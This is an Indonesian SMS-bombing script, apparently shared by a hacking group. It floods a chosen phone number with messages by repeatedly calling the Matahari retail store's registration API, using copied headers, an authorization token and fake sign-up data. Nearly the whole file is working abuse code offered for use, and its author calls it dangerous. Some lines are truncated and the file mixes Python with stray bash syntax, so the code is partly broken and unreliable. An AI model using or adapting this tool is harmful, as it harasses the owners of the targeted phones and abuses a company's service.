#!/bin/bash
#kalo mau recode izin dulu sama MR.G4NS/wa.me/085220980276
#Gunakan Tools Ini dengan Bijak Ya Syng :V
import requests,time,os,sys
os.system('clear')
os.system('figlet MATAHARI | lolcat')

print("""
        [ Spam Sms Matahari ]
        [ Autor  = MR.G4NS  ]
      [ Team  = CYBER INDONESIA ]
""")

no = input('ex : Wajib 08xx\n[In] Phone: ')
jml = int(input('[In] Jumlah: '))

heder = {'Host': 'thor.matahari.com',
           'content-length': '230',
           'modulecode': 'MR',
           'origin': 'https://www.matahari.com',
           'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2R1bGVDb2RlIjoiT             >
           'content-type': 'application/json',
           'accept': 'application/json, text/plain, */*',
           'clientid': 'mds_mweb',
           'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.             >
           'sessionid': '1595084426451',
           'save-data': 'on',
           'referer': 'https://www.matahari.com/register',
           'accept-encoding': 'gzip, deflate, br',
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6'}

data = {'emailAddress': 'noobie@mail.com',
           'firstName': 'Noobie',
           'lastName': 'Gans',
           'mobileNumber': no,
           'mccCardNumber': '',
           'password': 'asecc123',
           'referralCode': '',
           'dateOfBirth': '09-05-1993',
           'gender': 'Male',
           'registrationType': 'N'}

print("\n[WAIT TOOLS SAYA BERBAHAYA,AWOKAWOK]")
for i in range(jml):
      sec = requests.post('https://thor.matahari.com/MatahariMobileAPI/register', heade             >
      if 'eror' in sec.text:
           print(f'{i+1}. Gagal Spam Nya Ya Tod {no}')
      else:
           print(f'{i+1}. Berhasil Spam Nya Ya Tod {no}')
      time.sleep(1.5)
exit
fi